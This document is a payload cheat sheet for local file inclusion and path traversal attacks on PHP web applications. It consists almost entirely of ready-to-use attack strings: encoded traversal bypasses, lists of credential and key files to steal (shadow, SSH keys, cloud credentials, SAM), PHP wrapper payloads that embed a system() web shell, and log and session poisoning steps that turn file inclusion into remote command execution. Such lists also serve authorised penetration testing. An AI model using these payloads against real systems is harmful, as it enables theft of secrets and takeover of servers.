# PAYLOADS: LFI / Path Traversal & PHP Wrappers
## Version: 1.0 | Domain: payloads

---

## CLASSIC TRAVERSAL
```
../../../../../etc/passwd
....//....//....//etc/passwd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
%252e%252e%252fetc/passwd
..%c0%af..%c0%afetc/passwd
..%5c..%5c..%5cetc/passwd
/var/www/../../etc/passwd
file:///etc/passwd
```

## NULL BYTE (PHP <5.3)
```
../../../etc/passwd%00
../../../etc/passwd%00.png
```

## EXTENSION SUFFIX BYPASS
```
../../../etc/passwd?.png       # if not strict
../../../etc/passwd#.png
../../../etc/passwd//.png
../../../etc/passwd../passwd
```

## INTERESTING FILES — LINUX
```
/etc/passwd
/etc/shadow
/etc/hosts
/etc/issue
/etc/group
/etc/sudoers
/etc/crontab
/etc/cron.d/
/etc/ssh/sshd_config
/etc/apache2/apache2.conf
/etc/nginx/nginx.conf
/etc/mysql/my.cnf
/proc/self/environ
/proc/self/cmdline
/proc/self/status
/proc/self/maps
/proc/version
/proc/net/tcp
/proc/net/arp
/root/.ssh/id_rsa
/root/.ssh/authorized_keys
/root/.bash_history
/var/log/auth.log
/var/log/apache2/access.log
/var/log/nginx/access.log
/var/log/syslog
/var/mail/root
/var/spool/cron/crontabs/root
/var/www/html/.env
/var/www/html/wp-config.php
/var/www/html/configuration.php
~/.aws/credentials
~/.docker/config.json
~/.kube/config
~/.netrc
~/.npmrc
```

## INTERESTING FILES — WINDOWS
```
C:\\Windows\\win.ini
C:\\Windows\\System32\\drivers\\etc\\hosts
C:\\boot.ini
C:\\inetpub\\wwwroot\\web.config
C:\\Windows\\repair\\sam
C:\\Windows\\repair\\system
C:\\Windows\\repair\\security
C:\\Windows\\System32\\config\\SAM
C:\\Users\\Administrator\\.ssh\\id_rsa
%SYSTEMROOT%\\System32\\drivers\\etc\\hosts
```

## PHP WRAPPERS
```
php://filter/convert.base64-encode/resource=index.php
php://filter/read=convert.base64-encode/resource=index.php
php://filter/convert.iconv.UTF-8.UTF-16LE|convert.iconv.UTF-16LE.UTF-8/resource=index.php
php://filter/zlib.deflate/convert.base64-encode/resource=index.php
php://input                          # POST body executed if include
php://stdin
data://text/plain,<?php system($_GET[c]);?>
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NdKTs/Pg==
expect://id                          # if expect ext loaded
phar://upload.zip/x.txt              # PHP object injection chain
zip://upload.zip%23x.txt
file:///etc/passwd
```

## LOG POISONING (LFI → RCE)
```
# Inject PHP into Apache access log via User-Agent
GET / HTTP/1.1
User-Agent: <?php system($_GET['c']); ?>

# Then include the log:
?file=../../../var/log/apache2/access.log&c=id
```

## SESSION POISONING
```
# Inject via username/email/note that gets stored in PHP session file
<?php system($_GET['c']); ?>

# Then include:
?file=../../../var/lib/php/sessions/sess_<SID>&c=id
```

## /PROC SELF
```
?file=/proc/self/environ                        # poison via User-Agent
?file=/proc/self/cmdline
?file=/proc/self/fd/0
```

## ENCODED VARIANTS
```
%2e%2e%2f                              # ../
%2e%2e%5c                              # ..\
%c0%ae%c0%ae%c0%af                     # ../  (UTF-8 overlong)
..%252f                                 # double URL-encoded
..%c0%af
..%252fetc%252fpasswd
```

## REFERENCES
PayloadsAllTheThings/File Inclusion, OWASP testing guide
